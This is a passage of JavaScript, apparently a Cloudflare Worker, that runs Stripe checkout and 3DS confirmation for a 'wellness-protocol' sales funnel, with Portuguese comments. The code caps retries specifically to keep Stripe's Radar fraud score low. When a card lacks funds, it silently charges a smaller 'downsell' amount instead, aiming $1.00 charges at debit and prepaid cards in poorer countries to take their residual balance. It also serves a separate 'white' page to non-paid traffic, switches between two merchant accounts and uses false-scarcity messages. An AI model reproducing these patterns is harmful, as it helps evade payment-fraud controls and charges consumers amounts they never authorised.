        currency = resolveSmartCurrency(cardCountry);

        // 🔴 BLINDAGEM MÁXIMA DE TENTATIVAS (RADAR VELOCITY SHIELD):
        // Máximo 2 tentativas no mesmo cartão / 3 tentativas totais por cliente
        // Impede que requisições repetidas cheguem à Stripe e inflem o Radar Score para 80-92!
        const totalCardFails = Math.max(
          GLOBAL_CARD_FAILS.get(cardKey) || 0,
          cardFingerprint ? (GLOBAL_CARD_FAILS.get(cardFingerprint) || 0) : 0,
          cardLast4 ? (GLOBAL_CARD_FAILS.get(`${cleanEmail}_${cardLast4}`) || 0) : 0,
          GLOBAL_BLOCKED_CARDS.get(cardKey) || 0
        );
        const totalEmailFails = GLOBAL_EMAIL_FAILS.get(cleanEmail) || 0;

        if (totalEmailFails >= 3) {
          return new Response(JSON.stringify({
            ok: false,
            error: 'Too many payment attempts. Please wait 5 minutes before trying again or use a different card.',
            session_locked: true
          }), { status: 400, headers: corsHeaders });
        }

        if (totalCardFails >= 2) {
          return new Response(JSON.stringify({
            ok: false,
            error: 'Your bank has declined this card twice. To protect your account and avoid further bank blocks, please use a different card.',
            block_card: true,
            card_last4: cardLast4
          }), { status: 400, headers: corsHeaders });
        }

        // 🔴 RESOLUÇÃO ROBUSTA DE NOME DO CLIENTE:
        // Evita a todo custo salvar 'Customer' quando o cliente tem nome no input, na URL, no metadata ou no cartão
        const bodyName = (name && typeof name === 'string' && name.trim().toLowerCase() !== 'customer') ? name.trim() : '';
        const extraName = (extraParams.name && extraParams.name.toLowerCase() !== 'customer') ? extraParams.name.trim() 
          : ((extraParams.nome && extraParams.nome.toLowerCase() !== 'customer') ? extraParams.nome.trim() : '');
        const pmCardHolder = (pm && pm.billing_details && pm.billing_details.name && pm.billing_details.name.toLowerCase() !== 'customer') 
          ? pm.billing_details.name.trim() : '';

        let resolvedName = bodyName || extraName || pmCardHolder;

        // 🔴 REUTILIZAÇÃO DE CLIENTE + ATUALIZAÇÃO DE NOME SE ESTAVA 'Customer'
        let customer = null;
        const searchCustRes = await fetch(`https://api.stripe.com/v1/customers?email=${encodeURIComponent(cleanEmail)}&limit=3`, {
          headers: { 'Authorization': `Bearer ${frontSecretKey}` }
        });
        const searchCust = await searchCustRes.json();

        if (searchCust && searchCust.data && searchCust.data.length > 0) {
          customer = searchCust.data[0];
          const blockedMeta = (customer.metadata && customer.metadata.blocked_cards) || '';
          const blockedList = blockedMeta ? blockedMeta.split(',').filter(Boolean) : [];
          if (blockedList.length > 0 && ((cardFingerprint && blockedList.includes(cardFingerprint)) || (cardLast4 && blockedList.includes(cardLast4)))) {
            return new Response(JSON.stringify({
              ok: false,
              error: 'Your bank did not authorize this card previously. Please enter a different card.',
              block_card: true,
              card_last4: cardLast4
            }), { status: 400, headers: corsHeaders });
          }

          if (!resolvedName && customer.name && customer.name.toLowerCase() !== 'customer') {
            resolvedName = customer.name;
          } else if (resolvedName && (!customer.name || customer.name.toLowerCase() === 'customer')) {
            try {
              await fetch(`https://api.stripe.com/v1/customers/${customer.id}`, {
                method: 'POST',
                headers: { 'Authorization': `Bearer ${frontSecretKey}`, 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({ name: resolvedName }).toString()
              });
              customer.name = resolvedName;
            } catch (e) {}
          }

          // Associa o novo payment method ao customer existente (ignora se já anexado)
          try {
            await fetch(`https://api.stripe.com/v1/payment_methods/${payment_method_id}/attach`, {
              method: 'POST',
              headers: { 'Authorization': `Bearer ${frontSecretKey}`, 'Content-Type': 'application/x-www-form-urlencoded' },
              body: new URLSearchParams({ customer: customer.id }).toString()
            });
          } catch (e) {}
        } else {
          const customerParams = new URLSearchParams();
          customerParams.append('name', resolvedName || 'Customer');
          customerParams.append('email', cleanEmail);
          if (phone) customerParams.append('phone', phone);
          if (cardCountry) customerParams.append('address[country]', cardCountry);
          customerParams.append('payment_method', payment_method_id);
          for (const [k, v] of Object.entries(extraParams)) {
            if (k && v) customerParams.append(`metadata[${k.substring(0, 40)}]`, v.substring(0, 500));
          }
          if (resolvedName) customerParams.append('metadata[name]', resolvedName);
          customerParams.append('metadata[currency]', currency);

          const customerRes = await fetch('https://api.stripe.com/v1/customers', {
            method: 'POST',
            headers: { 'Authorization': `Bearer ${frontSecretKey}`, 'Content-Type': 'application/x-www-form-urlencoded' },
            body: customerParams.toString()
          });
          customer = await customerRes.json();
        }

        if (customer.error) return new Response(JSON.stringify({ ok: false, error: customer.error.message }), { status: 400, headers: corsHeaders });

        // Sincroniza o titular do cartão na Stripe se estiver vazio ou 'Customer' para evitar recusa code 63
        if (resolvedName && (!pm.billing_details?.name || pm.billing_details.name.toLowerCase() === 'customer')) {
          try {
            await fetch(`https://api.stripe.com/v1/payment_methods/${payment_method_id}`, {
              method: 'POST',
              headers: { 'Authorization': `Bearer ${frontSecretKey}`, 'Content-Type': 'application/x-www-form-urlencoded' },
              body: new URLSearchParams({ 'billing_details[name]': resolvedName }).toString()
            });
          } catch (e) {}
        }

        // 🔴 BLINDAGEM ANTI-DUPLICAÇÃO VITALÍCIA (LIFETIME ANTI-DUPLICATE SHIELD):
        // Se este cliente já comprou o Front ($9.90 ou $5.90) alguma vez na vida e o pagamento foi aprovado,
        // NÃO debita o cartão NUNCA MAIS! Evita duplicidade definitiva.
        // Redireciona imediatamente para o Upsell 1 (ou página safe) como pagamento concluído com sucesso.
        if (customer && customer.id) {
          try {
            const customerIdsToCheck = [customer.id];
            if (searchCust && searchCust.data) {
              searchCust.data.forEach(c => {
                if (c.id && !customerIdsToCheck.includes(c.id)) customerIdsToCheck.push(c.id);
              });
            }

            let alreadyPaid = null;

            // 1. Checa memória rápida do Worker (zero delay)
            const isKnownPurchaser = GLOBAL_PURCHASED_EMAILS.get(cleanEmail) || (cardFingerprint && GLOBAL_PURCHASED_CARDS.get(cardFingerprint));

            // 2. Checa todo o histórico de cobranças na Stripe deste cliente (sem limite de tempo)
            for (const cId of customerIdsToCheck) {
              const recentChargesRes = await fetch(`https://api.stripe.com/v1/charges?customer=${cId}&limit=25`, {
                headers: { 'Authorization': `Bearer ${frontSecretKey}` }
              });
              const recentCharges = await recentChargesRes.json();
              if (recentCharges && recentCharges.data && recentCharges.data.length > 0) {
                alreadyPaid = recentCharges.data.find(ch => 
                  ch.status === 'succeeded' && 
                  ch.paid === true && 
                  !ch.refunded && 
                  (ch.amount === FALLBACK_FRONT_PRICE_CENTS || ch.amount === 590 || ch.amount === 390 || ch.amount === 100 || ch.amount === amount)
                );
                if (alreadyPaid) break;
              }
            }

            if (alreadyPaid || isKnownPurchaser) {
              console.log(`[Anti-Duplicate Lifetime] Customer ${customer.id} (${cleanEmail}) already has front purchase. Redirecting directly to UP1 without re-charging.`);
              GLOBAL_PURCHASED_EMAILS.set(cleanEmail, true);
              if (cardFingerprint) GLOBAL_PURCHASED_CARDS.set(cardFingerprint, true);
              
              let pmCard = (alreadyPaid && alreadyPaid.payment_method_details && alreadyPaid.payment_method_details.card) || (pm && pm.card) || null;
              const userCountry = extraParams.country || (pmCard && pmCard.country) || clientCountry;
              const up1Plan = resolveDynamicUp1Price(pmCard, userCountry);
              const safeCampaign = (extraParams.utm_campaign && extraParams.utm_campaign.toLowerCase().includes('spot'))
                ? extraParams.utm_campaign
                : (extraParams.utm_campaign ? `${extraParams.utm_campaign}_spot` : 'spot');

              const paidAmount = (alreadyPaid && alreadyPaid.amount) ? alreadyPaid.amount : FALLBACK_FRONT_PRICE_CENTS;
              const baseNextUrl = (paidAmount === 590 || paidAmount === 390 || paidAmount === 100) ? FINAL_THANKS_URL : UP1_URL;
              const nextUrl = isSafe 
                ? appendParams(SAFE_THANKS_URL, { name: resolvedName, email: cleanEmail })
                : appendParams(baseNextUrl, {
                    ...extraParams,
                    utm_campaign: safeCampaign,
                    cid: customer.id,
                    pm: payment_method_id || (alreadyPaid && alreadyPaid.payment_method ? alreadyPaid.payment_method : ''),
                    acc: frontAcc,
                    name: resolvedName,
                    email: cleanEmail,
                    phone: phone,
                    country: userCountry,
                    price: up1Plan.price,
                    price_cents: up1Plan.price_cents,
                    tier: up1Plan.tier,
                    card_funding: (pmCard && pmCard.funding) || 'unknown'
                  });

              return new Response(JSON.stringify({
                ok: true,
                status: 'succeeded',
                amount: paidAmount,
                already_purchased: true,
                next_url: nextUrl,
                stripe_account: frontAcc
              }), { status: 200, headers: corsHeaders });
            }
          } catch (e) {
            console.error('[Anti-Duplicate Check Error]', e);
          }
        }

        const piParams = new URLSearchParams();
        piParams.append('amount', amount.toString());
        piParams.append('currency', currency);
        piParams.append('customer', customer.id);
        piParams.append('payment_method', payment_method_id);
        piParams.append('off_session', 'false');
        piParams.append('confirm', 'true');
        piParams.append('setup_future_usage', 'off_session');
        piParams.append('description', description); 
        piParams.append('automatic_payment_methods[enabled]', 'true');
        piParams.append('automatic_payment_methods[allow_redirects]', 'always');

        // 🚀 OTIMIZAÇÃO DE CONVERSÃO 3DS:
        // Configura 'automatic' para que a Stripe e o banco do cliente aprovem instantaneamente
        // transações de baixo valor ($9.90) e baixo risco (fluxo frictionless sem atrito).
        // Se a legislação local (ex: SCA na UE/UK) ou o emissor exigir 3DS, o desafio é solicitado
        // e nosso aviso visual orienta o cliente a confirmar no app/SMS.
        const isWallet = !!(pm && pm.card && pm.card.wallet);
        if (!isWallet) {
          piParams.append('payment_method_options[card][request_three_d_secure]', 'automatic');
        }
        
        // 🔴 OBRIGATÓRIO STRIPE: URL de retorno para onde o cliente volta se o 3DS exigir redirecionamento completo
        const returnUrl = appendParams(url.origin + '/', {
          ...extraParams,
          customer_id: customer.id,
          payment_method_id: payment_method_id,
          acc: frontAcc,
          name: resolvedName || 'Customer',
          email: cleanEmail,
          phone: phone
        });
        piParams.append('return_url', returnUrl);

        for (const [k, v] of Object.entries(extraParams)) {
          if (k && v) piParams.append(`metadata[${k.substring(0, 40)}]`, v.substring(0, 500));
        }

        const idempotencyKey = `front_${customer.id}_${payment_method_id}_${amount}`;
        const piRes = await fetch('https://api.stripe.com/v1/payment_intents', {
          method: 'POST',
          headers: { 
            'Authorization': `Bearer ${frontSecretKey}`, 
            'Content-Type': 'application/x-www-form-urlencoded',
            'Idempotency-Key': idempotencyKey
          },
          body: piParams.toString()
        });
        let paymentIntent = await piRes.json();

        // 🔴 FALLBACK INTELIGENTE 1 (transaction_not_allowed / 6P):
        // Se for cartão pré-pago ou banco europeu (ex: Grécia) que rejeitou o mandato off-session (setup_future_usage),
        // retira setup_future_usage imediatamente e tenta salvar a cobrança como compra avulsa única!
        const isTransactionNotAllowed = paymentIntent.error && (
          paymentIntent.error.decline_code === 'transaction_not_allowed' ||
          paymentIntent.error.network_decline_code === '6P' ||
          (paymentIntent.error.message && paymentIntent.error.message.toLowerCase().includes('not support this type of purchase'))
        );

        if (!isSafe && isTransactionNotAllowed && piParams.has('setup_future_usage')) {
          console.log(`[Smart Fallback] transaction_not_allowed detected for card ${cardLast4}. Retrying as one-time purchase without setup_future_usage...`);
          const oneTimeParams = new URLSearchParams(piParams);
          oneTimeParams.delete('setup_future_usage');
          oneTimeParams.set('description', `${description} (One-Time Purchase)`);

          const oneTimeIdempotencyKey = `front_ot_${customer.id}_${payment_method_id}_${amount}`;
          const retryRes = await fetch('https://api.stripe.com/v1/payment_intents', {
            method: 'POST',
            headers: { 
              'Authorization': `Bearer ${frontSecretKey}`, 
              'Content-Type': 'application/x-www-form-urlencoded',
              'Idempotency-Key': oneTimeIdempotencyKey
            },
            body: oneTimeParams.toString()
          });
          const retryIntent = await retryRes.json();
          if (!retryIntent.error && (retryIntent.status === 'succeeded' || retryIntent.status === 'requires_capture' || retryIntent.status === 'requires_action')) {
            paymentIntent = retryIntent;
          }
        }

        // 🔴 FALLBACK SEGURO 2: SÓ é acionado se for ESTRITAMENTE falta de saldo ('insufficient_funds')
        // Inteligência Dinâmica: Se for cartão de Débito/Pré-pago em países emergentes, tenta debitar $1.00 (100 cents) para salvar no saldo residual.
        // Se for país Tier 1 ou Cartão de Crédito, mantém $3.90 (390 cents) para maximizar o ticket médio.
        const isInsufficientFunds = paymentIntent.error && paymentIntent.error.decline_code === 'insufficient_funds';

        if (!isSafe && isInsufficientFunds) {
            const cardFunding = (pm && pm.card && pm.card.funding) ? String(pm.card.funding).toLowerCase() : 'credit';
            const isTier1 = isTier1Country(cardCountry);
            const isWeakDebit = !isTier1 && (cardFunding === 'debit' || cardFunding === 'prepaid');
            const fallbackAmount = isWeakDebit ? 100 : 390;
            const fallbackDesc = isWeakDebit ? 'wellness-protocol (Downsell $1.00)' : 'wellness-protocol (Downsell $3.90)';

            const fallbackParams = new URLSearchParams(piParams);
            fallbackParams.set('amount', fallbackAmount.toString());
            fallbackParams.delete('setup_future_usage'); // Remove off-session para permitir aprovação limpa de baixo valor no banco
            fallbackParams.set('description', fallbackDesc);

            await new Promise(r => setTimeout(r, 2000)); // Delay seguro de 2s para o banco respirar

            const fallbackIdempotencyKey = `front_fb_${customer.id}_${payment_method_id}_${fallbackAmount}`;
            const retryRes = await fetch('https://api.stripe.com/v1/payment_intents', {
                method: 'POST',
                headers: { 
                  'Authorization': `Bearer ${frontSecretKey}`, 
                  'Content-Type': 'application/x-www-form-urlencoded',
                  'Idempotency-Key': fallbackIdempotencyKey
                },
                body: fallbackParams.toString()
            });
            const retryIntent = await retryRes.json();
            
            if (!retryIntent.error && (retryIntent.status === 'succeeded' || retryIntent.status === 'requires_capture' || retryIntent.status === 'requires_action')) {
                paymentIntent = retryIntent;
                amount = fallbackAmount; // Atualiza o valor para o CAPI, Utmify e Pixel
            }
        }

        if (paymentIntent.error) {
          const declineCode = paymentIntent.error.decline_code || '';
          const isInsufficient = declineCode === 'insufficient_funds';
          const isNotAllowed = declineCode === 'transaction_not_allowed' || 
            paymentIntent.error.network_decline_code === '6P' || 
            (paymentIntent.error.message && paymentIntent.error.message.toLowerCase().includes('not support this type of purchase'));
          const isNonFundsDecline = !isInsufficient;

          // Se deu falta de saldo, o sistema já tentou $9.90 e $3.90 (2 tentativas no banco).
          // Se for outra recusa, incrementa 1 tentativa.
          const addedFails = isInsufficient ? 2 : 1;
          const fails = (GLOBAL_CARD_FAILS.get(cardKey) || 0) + addedFails;
          GLOBAL_CARD_FAILS.set(cardKey, fails);
          if (cardFingerprint) GLOBAL_CARD_FAILS.set(cardFingerprint, fails);
          if (cardLast4) GLOBAL_CARD_FAILS.set(`${cleanEmail}_${cardLast4}`, fails);

          const emailFails = (GLOBAL_EMAIL_FAILS.get(cleanEmail) || 0) + 1;
          GLOBAL_EMAIL_FAILS.set(cleanEmail, emailFails);

          // Bloqueia o cartão se falhou 2+ vezes e bloqueia a sessão se falhou 3+ vezes no total
          const shouldBlockCard = fails >= 2;
          const sessionLocked = emailFails >= 3;

          if (shouldBlockCard) {
            GLOBAL_BLOCKED_CARDS.set(cardKey, fails);
            if (customer && customer.id) {
              const existingBlocked = (customer.metadata && customer.metadata.blocked_cards) || '';
              const parts = existingBlocked.split(',').filter(Boolean);
              if (cardFingerprint && !parts.includes(cardFingerprint)) parts.push(cardFingerprint);
              if (cardLast4 && !parts.includes(cardLast4)) parts.push(cardLast4);
              const newBlocked = parts.join(',');

              ctx.waitUntil(fetch(`https://api.stripe.com/v1/customers/${customer.id}`, {
                method: 'POST',
                headers: { 'Authorization': `Bearer ${frontSecretKey}`, 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({
                  'metadata[blocked_cards]': newBlocked,
                  'metadata[last_decline_code]': declineCode || 'card_declined'
                }).toString()
              }));
            }
          }

          if (!isSafe && RESEND_API_KEY_LOCAL.includes('re_')) {
            const checkoutUrl = url.origin + url.pathname; 
            ctx.waitUntil(scheduleFailureEmail(env, cleanEmail, name, RESEND_API_KEY_LOCAL, checkoutUrl));
          }

          let friendlyMsg = '';
          if (sessionLocked) {
            friendlyMsg = 'Too many payment attempts. Please wait 5 minutes before trying again or use a different card.';
          } else if (shouldBlockCard) {
            friendlyMsg = isInsufficient
              ? 'Your bank has declined this card twice (insufficient balance). To avoid further bank blocks, please enter a different card with available funds to complete your order.'
              : 'Your bank has declined this card twice. To avoid further bank blocks, please use a different card to complete your order.';
          } else if (isInsufficient) {
            friendlyMsg = 'Your card has insufficient funds. Please enter another card with available balance to complete your order, or your reserved spot will be released to the next person in line.';
          } else if (isNotAllowed) {
            friendlyMsg = 'Your bank does not allow international or prepaid transactions on this card. Please try a standard credit or debit card, or enable international purchases in your banking app.';
          } else if (isNonFundsDecline) {
            friendlyMsg = 'Your bank did not authorize this transaction. If you received an SMS or app notification from your bank, please approve it and try again, or use another card.';
          } else {
            friendlyMsg = paymentIntent.error.message || 'Payment not approved. Please check your balance or try another card.';
          }

          return new Response(JSON.stringify({
            ok: false,
            error: friendlyMsg,
            is_insufficient_funds: isInsufficient,
            is_transaction_not_allowed: isNotAllowed,
            block_card: shouldBlockCard,
            session_locked: sessionLocked,
            card_last4: cardLast4,
            stripe_account: frontAcc
          }), { status: 400, headers: corsHeaders });
        }

        // 🔴 3DS AUTOMÁTICO: Se o banco exigir autenticação (requires_action), devolve o client_secret para abrir o popup nativo
        if (paymentIntent.status === 'requires_action') {
          return new Response(JSON.stringify({
            ok: true,
            requires_action: true,
            client_secret: paymentIntent.client_secret,
            payment_intent_id: paymentIntent.id,
            customer_id: customer.id,
            payment_method_id: payment_method_id,
            amount: amount,
            stripe_account: frontAcc
          }), { status: 200, headers: corsHeaders });
        }

        // Se o status ainda assim não for aprovado, bloqueia
        if (paymentIntent.status !== 'succeeded' && paymentIntent.status !== 'requires_capture') {
          if (cardFingerprint) GLOBAL_BLOCKED_CARDS.set(cardFingerprint, 3);
          if (cardLast4) GLOBAL_BLOCKED_CARDS.set(`${cleanEmail}_${cardLast4}`, 3);
          return new Response(JSON.stringify({
            ok: false,
            error: 'Your bank did not authorize this payment. Please use a different card.',
            block_card: true,
            card_last4: cardLast4,
            stripe_account: frontAcc
          }), { status: 400, headers: corsHeaders });
        }

        // Pagamento aprovado com sucesso: limpa qualquer contador de falhas deste cartão
        GLOBAL_BLOCKED_CARDS.delete(cardKey);
        if (cardFingerprint) GLOBAL_BLOCKED_CARDS.delete(cardFingerprint);
        if (cardLast4) GLOBAL_BLOCKED_CARDS.delete(`${cleanEmail}_${cardLast4}`);

        // Registra cliente e cartão como compradores vitalícios do front (zero repetição)
        GLOBAL_PURCHASED_EMAILS.set(cleanEmail, true);
        if (cardFingerprint) GLOBAL_PURCHASED_CARDS.set(cardFingerprint, true);

        // 🔴 E-MAIL DO RESEND: Dispara normalmente para tráfego pago (inclusive em testes), mas NUNCA na página white (Wellness-Protocol)
        if (!isSafe && RESEND_API_KEY_LOCAL.includes('re_')) {
          ctx.waitUntil(scheduleAccessEmail(env, cleanEmail, resolvedName || 'Customer', RESEND_API_KEY_LOCAL, FINAL_THANKS_URL));
        }

        // ==========================================
        // CAPI & UTMIFY: EVENTOS DE COMPRA APROVADA (APENAS TRÁFEGO PAGO)
        // ==========================================
        if (!isSafe) {
          ctx.waitUntil(sendCAPIEvent('Purchase', {
            email: cleanEmail,
            phone: phone,
            name: resolvedName || 'Customer',
            country: cardCountry || clientCountry,
            eventId: paymentIntent.id,
            externalId: (customer && customer.id) || paymentIntent.customer || cleanEmail,
            value: amount / 100,
            currency: currency,
            fbclid: extraParams.fbclid || urlParamsFromRequest.fbclid
          }, request, activePixelConfigs));

          if (UTMIFY_TOKEN) {
            ctx.waitUntil(sendUtmifyOrder({
              orderId: paymentIntent.id,
              platform: 'wellness-protocol',
              name: resolvedName || 'Customer',
              email: cleanEmail,
              phone: phone,
              country: cardCountry,
              productId: (amount === 100 || amount === 390 || amount === 590) ? 'downsell' : 'wellness-protocol',
              productName: (amount === 100) ? 'Downsell $1.00' : (amount === 390 ? 'Downsell $3.90' : (amount === 590 ? 'Downsell $5.90' : 'wellness-protocol')),
              priceInCents: amount,
              currency: currency,
              trackingParameters: extraParams
            }, request, UTMIFY_TOKEN, isTestMode));
          }
        }

        // 🔴 AJUSTE: Página white vai para o app do Wellness-Protocol. Tráfego pago vai pro Upsell (ou Obrigado se fallback)
        let nextUrl;
        if (isSafe) {
          nextUrl = appendParams(SAFE_THANKS_URL, { name: resolvedName || 'Customer', email: cleanEmail });
        } else {
          const baseNextUrl = (amount === 100 || amount === 390 || amount === 590) ? FINAL_THANKS_URL : UP1_URL;
          const userCountry = cardCountry;
          const up1Plan = resolveDynamicUp1Price(pm && pm.card, userCountry);
          const up1Price = up1Plan.price;
          const up1Cents = up1Plan.price_cents;
          const up1Tier = up1Plan.tier;
          const safeCampaign = (extraParams.utm_campaign && extraParams.utm_campaign.toLowerCase().includes('spot')) 
            ? extraParams.utm_campaign 
            : (extraParams.utm_campaign ? `${extraParams.utm_campaign}_spot` : 'spot');
          nextUrl = appendParams(baseNextUrl, { 
            ...extraParams, 
            utm_campaign: safeCampaign,
            cid: customer.id, 
            pm: payment_method_id, 
            acc: frontAcc,
            name: resolvedName || 'Customer', 
            email: cleanEmail, 
            phone: phone,
            country: userCountry,
            currency: currency,
            price: up1Price,
            price_cents: up1Cents,
            tier: up1Tier,
            card_funding: (pm && pm.card && pm.card.funding) || 'unknown'
          });
        }
        return new Response(JSON.stringify({ ok: true, status: paymentIntent.status, amount: amount, next_url: nextUrl, order_id: paymentIntent.id, stripe_account: frontAcc }), { status: 200, headers: corsHeaders });
      } catch (err) {
        return new Response(JSON.stringify({ ok: false, error: err.message }), { status: 500, headers: corsHeaders });
      }
    }

    // -------------------------------------------------------------------------------------
    // 🔐 ENDPOINT 2: /api/stripe-confirm-3ds (Confirmação de Autenticação Bancária 3DS)
    // - Chamado quando o banco do cliente exige validação biométrica / SMS / App
    // - Finaliza a captura do valor após a aprovação do desafio 3D Secure
    // - Redireciona o comprador para o Upsell 1 mantendo os parâmetros salvos
    // -------------------------------------------------------------------------------------
    if (url.pathname === '/api/stripe-confirm-3ds' && request.method === 'POST') {
      try {
        const body = await request.json();
        const { payment_intent_id, customer_id, payment_method_id, name, email, phone } = body;
        const cleanEmail = sanitizeEmail(email);
        
        const urlParamsFromRequest = Object.fromEntries(url.searchParams.entries());
        const extraParams = { ...urlParamsFromRequest, ...(body.extra_params || {}) };

        // 🔴 Resolve a conta correta da Stripe (com resiliência automática)
        let confirmAcc = body.stripe_account || body.acc || extraParams.acc || url.searchParams.get('acc') || 'a';
        let confirmStripeCreds = getStripeCredentials(confirmAcc, isTestMode);
        let confirmSecretKey = confirmStripeCreds.secretKey;

        const bodyName = (name && typeof name === 'string' && name.trim().toLowerCase() !== 'customer') ? name.trim() : '';
        const extraName = (extraParams.name && extraParams.name.toLowerCase() !== 'customer') ? extraParams.name.trim() 
          : ((extraParams.nome && extraParams.nome.toLowerCase() !== 'customer') ? extraParams.nome.trim() : '');
        const resolvedName = bodyName || extraName || 'Customer';

        if (!payment_intent_id) {
          return new Response(JSON.stringify({ ok: false, error: 'Payment intent ID required.' }), { status: 400, headers: corsHeaders });
        }

        // 1. Consulta o status real do PaymentIntent na Stripe após o cliente ter autenticado no modal 3DS
        let piRes = await fetch(`https://api.stripe.com/v1/payment_intents/${payment_intent_id}`, {
          headers: { 'Authorization': `Bearer ${confirmSecretKey}` }
        });
        let paymentIntent = await piRes.json();

        // 🛡️ Se o PaymentIntent pertencer à outra conta, chaveia automaticamente
        if (paymentIntent.error && (paymentIntent.error.code === 'resource_missing' || paymentIntent.error.message?.includes('No such payment_intent'))) {
          const altAcc = confirmAcc === 'b' ? 'a' : 'b';
          const altCreds = getStripeCredentials(altAcc, isTestMode);
          const altPiRes = await fetch(`https://api.stripe.com/v1/payment_intents/${payment_intent_id}`, {
            headers: { 'Authorization': `Bearer ${altCreds.secretKey}` }
          });
          const altPi = await altPiRes.json();
          if (!altPi.error) {
            confirmAcc = altAcc;
            confirmStripeCreds = altCreds;
            confirmSecretKey = altCreds.secretKey;
            paymentIntent = altPi;
          }
        }

        // 🔴 PROTEÇÃO CONTRA RACE CONDITION: Se a Stripe ainda estiver processando o retorno do 3DS (requires_action),
        // aguarda 600ms e faz uma reconsulta antes de tentar confirmar
        if (paymentIntent.status === 'requires_action') {
          await new Promise(r => setTimeout(r, 600));
          piRes = await fetch(`https://api.stripe.com/v1/payment_intents/${payment_intent_id}`, {
            headers: { 'Authorization': `Bearer ${confirmSecretKey}` }
          });
          paymentIntent = await piRes.json();
        }

        // 🔴 CRÍTICO: Se o 3DS foi concluído com sucesso pelo cliente, a Stripe coloca em 'requires_confirmation'!
        // É OBRIGATÓRIO chamar /confirm na API da Stripe COM 'return_url' para debitar e finalizar o pagamento!
        if (paymentIntent.status === 'requires_confirmation') {
          const confirmParams = new URLSearchParams();
          const returnUrl = appendParams(url.origin + '/', {
            ...extraParams,
            customer_id: customer_id,
            payment_method_id: payment_method_id,
            acc: confirmAcc,
            name: resolvedName,
            email: cleanEmail,
            phone: phone
          });
          confirmParams.append('return_url', returnUrl);

          const confirmCallRes = await fetch(`https://api.stripe.com/v1/payment_intents/${payment_intent_id}/confirm`, {
            method: 'POST',
            headers: {
              'Authorization': `Bearer ${confirmSecretKey}`,
              'Content-Type': 'application/x-www-form-urlencoded',
              'Idempotency-Key': `confirm_3ds_${payment_intent_id}`
            },
            body: confirmParams.toString()
          });
          paymentIntent = await confirmCallRes.json();
        }

        if (paymentIntent.error || (paymentIntent.status !== 'succeeded' && paymentIntent.status !== 'requires_capture' && paymentIntent.status !== 'processing')) {
          const errMsg = (paymentIntent.error && paymentIntent.error.message)
            ? paymentIntent.error.message
            : 'Authentication not completed. Please try another card.';
          return new Response(JSON.stringify({ ok: false, error: errMsg, block_card: false, stripe_account: confirmAcc }), { status: 400, headers: corsHeaders });
        }

        const amount = paymentIntent.amount;
        const currency = paymentIntent.currency || FALLBACK_CURRENCY;

        const isSafe = body.is_safe === true || !isPaidTrafficRequest(url);

        // 🔴 E-MAIL DO RESEND: Dispara normalmente para tráfego pago (inclusive em testes), mas NUNCA na página white (Wellness-Protocol)
        if (!isSafe && RESEND_API_KEY_LOCAL.includes('re_')) {
          ctx.waitUntil(scheduleAccessEmail(env, cleanEmail, resolvedName, RESEND_API_KEY_LOCAL, FINAL_THANKS_URL));
        }

        // ==========================================
        // CAPI & UTMIFY: EVENTO DE PURCHASE CONFIRMADO (3DS) - APENAS TRÁFEGO PAGO
        // ==========================================
        if (!isSafe) {
          ctx.waitUntil(sendCAPIEvent('Purchase', {
            email: cleanEmail,
            phone: phone,
            name: resolvedName,
            country: extraParams.country || clientCountry,
            eventId: paymentIntent.id,
            externalId: customer_id || cleanEmail,
            value: amount / 100,
            currency: currency,
            fbclid: extraParams.fbclid || urlParamsFromRequest.fbclid
          }, request, activePixelConfigs));

          if (UTMIFY_TOKEN) {
            ctx.waitUntil(sendUtmifyOrder({
              orderId: paymentIntent.id,
              platform: 'wellness-protocol',
              name: resolvedName,
              email: cleanEmail,
              phone: phone,
              country: extraParams.country || clientCountry,
              productId: (amount === 100 || amount === 390 || amount === 590) ? 'downsell' : 'wellness-protocol',
              productName: (amount === 100) ? 'Downsell $1.00' : (amount === 390 ? 'Downsell $3.90' : (amount === 590 ? 'Downsell $5.90' : 'wellness-protocol')),
              priceInCents: amount,
              currency: currency,
              trackingParameters: extraParams
            }, request, UTMIFY_TOKEN, isTestMode));
          }
        }

        // Registra cliente e cartão como compradores vitalícios do front (zero repetição)
        GLOBAL_PURCHASED_EMAILS.set(cleanEmail, true);
        if (paymentIntent.charges?.data?.[0]?.payment_method_details?.card?.fingerprint) {
          GLOBAL_PURCHASED_CARDS.set(paymentIntent.charges.data[0].payment_method_details.card.fingerprint, true);
        }

        // 🔴 Se for página safe, vai pro app do Wellness-Protocol. Se for tráfego pago, segue o funil normal
        let nextUrl;
        if (isSafe) {
          nextUrl = appendParams(SAFE_THANKS_URL, { name: resolvedName, email: cleanEmail });
        } else {
          const baseNextUrl = (amount === 100 || amount === 390 || amount === 590) ? FINAL_THANKS_URL : UP1_URL;
          let pmCard = null;
          if (paymentIntent && paymentIntent.charges && paymentIntent.charges.data && paymentIntent.charges.data[0] && paymentIntent.charges.data[0].payment_method_details) {
            pmCard = paymentIntent.charges.data[0].payment_method_details.card;
          }
          const userCountry = extraParams.country || (pmCard && pmCard.country) || clientCountry;
          const up1Plan = resolveDynamicUp1Price(pmCard, userCountry);
          const up1Price = up1Plan.price;
          const up1Cents = up1Plan.price_cents;
          const up1Tier = up1Plan.tier;
          const safeCampaign = (extraParams.utm_campaign && extraParams.utm_campaign.toLowerCase().includes('spot')) 
            ? extraParams.utm_campaign 
            : (extraParams.utm_campaign ? `${extraParams.utm_campaign}_spot` : 'spot');
          nextUrl = appendParams(baseNextUrl, { 
            ...extraParams, 
            utm_campaign: safeCampaign,
            cid: customer_id, 
            pm: payment_method_id, 
            acc: confirmAcc,
            name: resolvedName, 
            email: cleanEmail, 
            phone: phone,
            country: userCountry,
            currency: currency,
            price: up1Price,
            price_cents: up1Cents,
            tier: up1Tier,
            card_funding: (pmCard && pmCard.funding) || 'unknown'
          });
        }
        return new Response(JSON.stringify({ ok: true, status: paymentIntent.status, amount: amount, next_url: nextUrl, order_id: paymentIntent.id, stripe_account: confirmAcc }), { status: 200, headers: corsHeaders });
      } catch (err) {
        return new Response(JSON.stringify({ ok: false, error: err.message }), { status: 500, headers: corsHeaders });
      }
    }

    // -------------------------------------------------------------------------------------
    // ⚡ ENDPOINT 3: /api/stripe-charge-upsell (Cobrança em 1-Clique dos Upsells UP1 e UP2)
    // - Cobra o cartão previamente salvo sem solicitar dados novamente (Off-Session)
    // - UP1: Precificação dinâmica ($27.90 / $15.00 / $5.90) com fallback inteligente
    // - UP2: Oferta final de $17.90
    // - Dispara Purchase no Meta CAPI e pedido na Utmify para cada upsell aprovado
    // -------------------------------------------------------------------------------------
